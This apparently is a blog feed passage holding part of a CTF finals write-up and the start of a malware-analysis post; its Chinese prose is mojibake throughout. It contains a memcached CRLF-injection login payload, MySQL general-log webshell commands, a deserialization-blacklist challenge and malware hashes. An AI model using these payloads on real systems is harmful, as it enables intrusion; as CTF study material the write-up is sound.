punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"stdout"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æºç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> time <span class="token keyword">import</span> time<span class="token keyword">import</span> jsonpickle<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> os<span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>    username<span class="token punctuation">:</span> <span class="token builtin">str</span>    password<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Token</span><span class="token punctuation">:</span>    username<span class="token punctuation">:</span> <span class="token builtin">str</span>    timestamp<span class="token punctuation">:</span> <span class="token builtin">int</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>users <span class="token operator">=</span> <span class="token punctuation">[</span>User<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> User<span class="token punctuation">(</span><span class="token string">'guest'</span><span class="token punctuation">,</span> <span class="token string">'guest'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>BLACKLIST <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'repr'</span><span class="token punctuation">,</span>    <span class="token string">'state'</span><span class="token punctuation">,</span>    <span class="token string">'json'</span><span class="token punctuation">,</span>    <span class="token string">'reduce'</span><span class="token punctuation">,</span>    <span class="token string">'tuple'</span><span class="token punctuation">,</span>    <span class="token string">'nt'</span><span class="token punctuation">,</span>    <span class="token string">'\\'</span><span class="token punctuation">,</span>    <span class="token string">'builtins'</span><span class="token punctuation">,</span>    <span class="token string">'os'</span><span class="token punctuation">,</span>    <span class="token string">'popen'</span><span class="token punctuation">,</span>    <span class="token string">'exec'</span><span class="token punctuation">,</span>    <span class="token string">'eval'</span><span class="token punctuation">,</span>    <span class="token string">'posix'</span><span class="token punctuation">,</span>     <span class="token string">'spawn'</span><span class="token punctuation">,</span>    <span class="token string">'compile'</span><span class="token punctuation">,</span>    <span class="token string">'code'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>    otoken <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span>    token <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>otoken<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> BLACKLIST<span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> token<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'Home'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">if</span> user<span class="token punctuation">.</span>username <span class="token operator">==</span> username <span class="token keyword">and</span> user<span class="token punctuation">.</span>password <span class="token operator">==</span> password<span class="token punctuation">:</span>            res <span class="token operator">=</span> app<span class="token punctuation">.</span>make_response<span class="token punctuation">(</span><span class="token string">'Login successful'</span><span class="token punctuation">)</span>            token <span class="token operator">=</span> Token<span class="token punctuation">(</span>username<span class="token punctuation">,</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            res<span class="token punctuation">.</span>status_code <span class="token operator">=</span> <span class="token number">302</span>            res<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>jsonpickle<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Location'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'/home'</span>            <span class="token keyword">return</span> res    <span class="token keyword">return</span> <span class="token string">'Invalid credentials (guest/guest)'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token<span class="token punctuation">:</span>        jtoken <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>        token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jtoken<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Welcome </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span></span><span class="token string">, but you are not admin'</span></span>            <span class="token keyword">return</span> <span class="token string">'Welcome admin, there is something in /s3Cr3T'</span>    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/s3Cr3T'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">secret</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token<span class="token punctuation">:</span>        jtoken <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>        token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jtoken<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>            <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''if not waf(token):    return 'Invalid token'token = jsonpickle.decode(token, safe=True)if time() - token.timestamp &lt; 60:    if token.username != 'admin':        return f'Welcome &#123;token.username&#125;, but you are not admin'    return 'Welcome admin, there is something in /s3Cr3T'return 'Invalid token''''</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒæ ·çš„æ–¹æ³•ç”¨ &#x2F;readflag è¯»å–flagå³å¯</p><hr><h2 id="anniversaryï¼ˆ0-Solvedï¼‰"><a href="#anniversaryï¼ˆ0-Solvedï¼‰" class="headerlink" title="anniversaryï¼ˆ0 Solvedï¼‰"></a>anniversaryï¼ˆ0 Solvedï¼‰</h2><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206100717732.png" alt="image-20241206100717732"></p><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206101144441.png" alt="image-20241206101144441"></p><p>è§‚å¯Ÿæ¸²æŸ“æ ¼å¼ï¼Œè¿™é‡Œæ˜¯<code>æ–¹æ³• å‚æ•°</code>çš„å½¢å¼</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'è·ç¦»çºªå¿µæ—¥è¿˜æœ‰ &#123;&#123;anniversary_time_diff t=1736006400000 l=\"cn\"&#125;&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æµ‹è¯•æŠ¥é”™ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Error<span class="token punctuation">:</span> Invalid time valueTypeError<span class="token punctuation">:</span> Cannot destructure <span class="token builtin">property</span> <span class="token string">'hash'</span> of <span class="token string">'arguments[0]'</span> <span class="token keyword">as</span> it <span class="token keyword">is</span> undefined<span class="token punctuation">.</span>TypeError<span class="token punctuation">:</span> Cannot destructure <span class="token builtin">property</span> <span class="token string">'t'</span> of <span class="token string">'hash'</span> <span class="token keyword">as</span> it <span class="token keyword">is</span> undefined<span class="token punctuation">.</span>RangeError<span class="token punctuation">:</span> Invalid time value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hintï¼š</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">æç¤ºï¼š1. å°è¯•æ¢æµ‹æœåŠ¡ç«¯æ¸²æŸ“æ¨¡ç‰ˆçš„ç»„ä»¶åŠå…¶ç‰ˆæœ¬2. anniversary_time_diffæ— æ³•åˆ©ç”¨3. å°è¯•å‘ç°å…¶ä»–æ¨¡ç‰ˆå¯ä»¥è®¿é—®çš„å‡½æ•°/å˜é‡4. å°è¯•åˆ©ç”¨æ¨¡ç‰ˆæ¸²æŸ“ç»„ä»¶æœ¬èº«çš„æ¼æ´å®ç°RCE5. å°è¯•ç±»å‹æ··æ·†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹ä¸å‡ºæ¥ï¼Œä»€ä¹ˆnodejsæ¨¡æ¿ä¼šåªæ¸²æŸ“<code>&#123;&#123;&#125;&#125;</code>ï¼Œ<code>[]</code>èƒ½è¿”å›ä¸€ä¸ª object å•Š</p><hr><h1 id="RW"><a href="#RW" class="headerlink" title="RW"></a>RW</h1><h2 id="TS-ï¼ˆUnsolvedï¼‰"><a href="#TS-ï¼ˆUnsolvedï¼‰" class="headerlink" title="TS++ï¼ˆUnsolvedï¼‰"></a>TS++ï¼ˆUnsolvedï¼‰</h2><p>thinkshop è¿˜åœ¨è¿½æˆ‘</p><p>å’Œ thinkshopping ä¸€æ ·çš„æ“ä½œæ‰“ memcached è¿›åå°</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/public/index.php/index/admin/do_login.html</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:36000</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=gan31bc5bm4k4jn9v7npb878g6</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">255</span></span>username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å­è´¦å¯† admin:admin è¿›åå°</p><p>ä½†æ˜¯ secure_file_priv ä¸º <code>/var/lib/mysql-files/</code>ï¼Œä¸èƒ½è¯»æ–‡ä»¶äº†</p><p>æ€»ä¹‹ diff çœ‹ä¸€ä¸‹å’Œä¸Šä¸€ä»£æ¯”æœ‰å“ªäº›å˜åŒ–å§</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">diff</span> <span class="token parameter variable">-rq</span> web1 web2Files web1/application/index/model/Goods.php and web2/application/index/model/Goods.php differFiles web1/application/index/view/admin/goods_add.html and web2/application/index/view/admin/goods_add.html differFiles web1/application/index/view/admin/goods_edit.html and web2/application/index/view/admin/goods_edit.html differFiles web1/application/index/view/index/goods.html and web2/application/index/view/index/goods.html differ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯¹æ¯”äº†ä¸€ä¸‹ï¼Œgoods_edit.html å’Œ goods.html é‡Œå¤šäº†ä¸ª base64 è§£ç ï¼ŒGoods.php åˆ æ‰äº†åé¢ä¸€ä¸²ç”¨ä¸ä¸Šçš„ä»£ç </p><p>sql é‡Œä»æœ‰<code>(1, &#39;admin&#39;, &#39;e10adc3949ba59abbe56e057f20f883e&#39;);</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥<code>1:123456</code>è¿›åå°</p><p>é‚£ä¹ˆå”¯ä¸€çš„é—®é¢˜å°±æ˜¯æˆ‘ä»¬ç°åœ¨åªæœ‰sqlæ³¨å…¥ï¼Œå†™ä¸äº†shell</p><p>æ„Ÿè§‰è¿˜æ˜¯è¦ä» memcached CRLF å…¥æ‰‹</p><p>å°è¯•å†™æ—¥å¿—</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show variables like &#39;%general%&#39;;set global general_log &#x3D; on;set global general_log_file &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;public&#x2F;info.php&#39;;select &#39;&lt;?php phpinfo();?&gt;&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬åœ°å®¹å™¨ç»ˆç«¯ä¸Šæµ‹è¯•èƒ½å†™ï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿè®¿é—®ï¼Œé‚æ”¾å¼ƒæ³¨å…¥</p><p>æœ€åæƒ³äº†ä¸‹ï¼Œæ—¢ç„¶æˆ‘ä»¬èƒ½å¾€ memcached é‡Œé¢å†™å…¥åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ç›´æ¥æŠŠ poc çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–</p><p>ç„¶åå°±æœåˆ°äº†è¿™ä¸ªï¼š<a href="https://zhcy2018.github.io/2023/%E5%BC%BA%E7%BD%91%E6%9D%AF%20thinkshopping.html">https://zhcy2018.github.io/2023/%E5%BC%BA%E7%BD%91%E6%9D%AF%20thinkshopping.html</a></p><p>ä½†æ˜¯æ¥ä¸åŠäº†ï¼Œæ²¡æ¥å¾—åŠå¤šç ”ç©¶å°±æ¶ä¸Šå°å»å°è¯•äº†ï¼Œç„¶åç¿»è½¦äº†XD</p><hr><h1 id="æ¸¸è®°ï¼ˆto-be-continuedï¼‰"><a href="#æ¸¸è®°ï¼ˆto-be-continuedï¼‰" class="headerlink" title="æ¸¸è®°ï¼ˆto be continuedï¼‰"></a>æ¸¸è®°ï¼ˆto be continuedï¼‰</h1><p>ä¸‰å¤©çš„å¼ºç½‘æ¢¦ç»“æŸäº†ï¼Œå½’æ¥ä¾æ—§æ˜¯ä¸ªè‡­åŒéçš„å­¦ç”Ÿï¼Œå†™ä¸ªé”¤å­æ¸¸è®°ï¼Œddlèµ¶ä¸å®Œäº†ï¼Œç­‰è‚å®Œddlå†è¯´ â€”â€” 2024.12.8</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æˆ‘å¤§æ¦‚ä¸€è¾ˆå­éƒ½å¿˜ä¸äº†å¼ºç½‘æ¯äº†å§&lt;/p&gt;</summary>
    
    
    
    <category term="çº¿ä¸‹èµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>ç—…æ¯’æœ¨é©¬æ ·æœ¬é€†å‘</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/</id>
    <published>2024-12-03T16:05:04.000Z</published>
    <updated>2024-12-12T02:29:22.384Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ğŸ</p><span id="more"></span><hr><h1 id="ç®€å•ç—…æ¯’é€†å‘åˆ†æ"><a href="#ç®€å•ç—…æ¯’é€†å‘åˆ†æ" class="headerlink" title="ç®€å•ç—…æ¯’é€†å‘åˆ†æ"></a>ç®€å•ç—…æ¯’é€†å‘åˆ†æ</h1><p>ç”µè„‘ç—…æ¯’ï¼ˆcomputer virusï¼‰ï¼Œæˆ–ç§°ç”µå­è®¡ç®—æœºç—…æ¯’ã€‚æ˜¯ä¸€ç§åœ¨äººä¸ºæˆ–éäººä¸ºçš„æƒ…å†µä¸‹äº§ç”Ÿçš„ã€åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…æˆ–æœªæ‰¹å‡†ä¸‹ï¼Œèƒ½è‡ªæˆ‘å¤åˆ¶æˆ–è¿è¡Œçš„ç”µè„‘ç¨‹åºï¼›ç”µè„‘ç—…æ¯’å¾€å¾€ä¼šå½±å“å—æ„ŸæŸ“ç”µè„‘çš„æ­£å¸¸è¿ä½œï¼Œæˆ–æ˜¯è¢«æ§åˆ¶è€Œä¸è‡ªçŸ¥ï¼Œç”µè„‘æ­£å¸¸è¿ä½œä»…ç›—çªƒèµ„æ–™ã€æˆ–è€…è¢«åˆ©ç”¨åšå…¶ä»–ç”¨é€”ç­‰ç”¨æˆ·éè‡ªå‘å¯åŠ¨çš„è¡Œä¸ºã€‚</p><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><ul><li>é’ˆå¯¹ç—…æ¯’çš„ç®€å•åˆ†æ</li><li>æŒæ¡å‘ç°ç—…æ¯’åçš„å„ç±»æ“ä½œ</li></ul><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><h3 id="æ•°æ®æºå‡†å¤‡"><a href="#æ•°æ®æºå‡†å¤‡" class="headerlink" title="æ•°æ®æºå‡†å¤‡"></a>æ•°æ®æºå‡†å¤‡</h3><ul><li><p>ç—…æ¯’æ–‡ä»¶åŸºæœ¬ä¿¡æ¯ï¼š</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">æ–‡ä»¶åï¼š35a7db3cde6c0744dc2146f23f499df8ad527c93å¤§å°ï¼š229 KB (234,496 å­—èŠ‚)CRC32ï¼š7E28EBC8MD5ï¼š324B6AB5E45E2A106025BE8802D39511SHA-1ï¼š35A7DB3CDE6C0744DC2146F23F499DF8AD527C93<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>æŸ¥å£³ç¨‹åºï¼šæœ¬æ¬¡é€šè¿‡ <strong>Exeinfo PE</strong> æ¥è¿›è¡ŒæŸ¥è¯¢ï¼Œè¯¥è½¯ä»¶ç›®å‰å†…ç½®æµ·é‡ PEiD çš„ç­¾ååº“å¹¶æ•´åˆäº†è¿‘ 50 ç§æ’ä»¶ä»¥åŠæ›´åŠ å®Œæ•´çš„ä¸­æ–‡è¯­è¨€åŒ…ï¼Œå…·å¤‡éå¸¸å¼ºæ‚çš„å¯é‰´å®šå¤šç§æ–‡ä»¶ç±»åˆ«çš„èƒ½åŠ›ï¼Œå…¨é¢å…¼å®¹åŒ…æ‹¬bmpã€.jpgã€.movã€.mp4ã€.vpxã€.crxã€.sknã€.dcuã€.objã€.iceã€.apkã€.TLBã€.dddã€.dcuã€.pkgã€.mkvã€.WebMã€.isoã€.xarã€.nupã€.vhdã€.tarã€.gmaã€.mtsã€resã€tiffã€7zã€rar åœ¨å†…çš„å¤šç§æ–‡ä»¶æ ¼å¼ï¼Œæ”¯æŒæŸ¥çœ‹åŠ å¯†ç¨‹åºçš„ PE ä¿¡æ¯ã€ç¼–è¯‘ä¿¡æ¯ã€æ˜¯å¦åŠ å£³ã€è¾“å…¥è¾“å‡ºè¡¨ã€å…¥å£åœ°å€ã€é¦–å­—èŠ‚ã€æ–‡ä»¶å¤§å°ã€å­ç³»ç»Ÿä¸è¦†ç›–ç­‰ä»»ä½•å¯æ‰§è¡Œç¨‹åºçš„å¤šç§ç›¸å…³ä¿¡æ¯ï¼Œç»™äºˆç”¨æˆ·å¼•å¯¼è„±å£³æ–¹æ³•</p></li><li><p>è„±å£³å·¥å…·ï¼š<strong>XVolkolak</strong> æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„é€šç”¨ shelling å®ç”¨ç¨‹åºï¼Œå¸¦æœ‰è™šæ‹Ÿæœºã€‚å®ƒæ—¨åœ¨å¸®åŠ©ç”¨æˆ·å¿«é€Ÿè§£å†³å„ç§åŠ å¯† shellã€‚ä¸å…¶ä»– shelling å·¥å…·ä¸åŒï¼Œå®ƒä½¿ç”¨è™šæ‹Ÿæœºè„±å£³æŠ€æœ¯ã€‚é¿å…æŸåç”¨æˆ·ç³»ç»Ÿï¼ŒåŒæ—¶ä½¿ç”¨ XVolkolakï¼Œè¿˜å¯ä»¥æ‰§è¡Œ PE ç¼–è¾‘ï¼Œæ•°æ®æ‰«ææ£€æµ‹å’Œå¿«é€Ÿ shell æ£€æŸ¥æ“ä½œï¼Œæ”¯æŒæ‹–æ”¾æ“ä½œï¼Œæ˜“äºä½¿ç”¨</p></li></ul><h3 id="ç—…æ¯’åˆ†æ"><a href="#ç—…æ¯’åˆ†æ" class="headerlink" title="ç—…æ¯’åˆ†æ"></a>ç—…æ¯’åˆ†æ</h3><p>æŸ¥å£³ï¼š</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241204104144941.png" alt="image-20241204104144941"></p><p>æœ‰å£³ï¼Œæ˜¯ MPRESSï¼ŒåŒæ—¶æŸ¥çœ‹åˆ°æ–‡ä»¶æ˜¯ PE æ–‡ä»¶ï¼Œä½¿ç”¨ XVolkolak è¿›è¡Œè„±å£³</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241204104429569.png" alt="image-20241204104429569"></p><p>è„±å£³å®Œæ¯•åç”Ÿæˆä¸€ä¸ª .unp æ–‡ä»¶ï¼Œæ‹–å…¥ OD åœ¨å…¥å£ç‚¹å¤„ï¼Œå¯ä»¥çœ‹åˆ°å„é¡¹åŠŸèƒ½æ˜¾ç¤ºæ­£å¸¸ï¼Œè¯´æ˜è„±å£³æˆåŠŸ</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241204105705591.png" alt="image-20241204105705591"></p><p>é€šè¿‡ç«ç»’å‰‘è¯†åˆ«ç—…æ¯’è¡Œä¸ºè¿›è¡Œåˆ†æï¼Œå°†æœªè„±å£³çš„æºæ–‡ä»¶æ”¹ä¸ºï¼š1.exe</p><p>å°†ç—…æ¯’ exe æ‹–åŠ¨åˆ°ç«ç»’å‰‘çª—å£å½“ä¸­ï¼ˆéœ€å…³é—­ç«ç»’é˜²æŠ¤ï¼‰</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211111245535.png" alt="image-20241211111245535"></p><p><img 